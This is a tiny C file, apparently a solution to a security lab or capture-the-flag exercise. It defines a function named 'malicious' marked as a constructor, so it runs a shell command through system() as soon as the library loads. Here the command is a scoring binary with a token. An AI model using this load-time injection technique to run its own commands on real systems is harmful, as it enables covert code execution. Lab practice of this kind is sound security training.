#include <stdio.h>
#include <stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 629ca875-6ba5-48eb-bf3c-f10099e61202");
}

